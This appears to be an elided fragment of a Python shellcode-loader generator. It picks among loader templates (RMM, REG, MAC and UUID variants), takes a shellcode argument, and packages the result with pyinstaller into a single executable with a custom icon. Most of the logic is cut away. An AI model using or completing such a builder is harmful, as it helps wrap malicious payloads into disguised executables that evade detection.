...
temper_list = ["RMM_loader1/2/3","REG_loader1/2/3","MAC_loader1/2/3","UUID_loader1/2/3"]
temp_files = {
...
if __name__ == '__main__':
    if len(sys.argv) == 3:
        if sys.argv[2].find("MAC") == 0:
            ...
            os.system("pyinstaller {} --onefile --icon=./icon_file/s1.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]]))
        ...
        print("temper_list : {}".format(temper_list))
        print("usege : python2 {} [shellcode] [loader_temper]\n".format(sys.argv[0]))
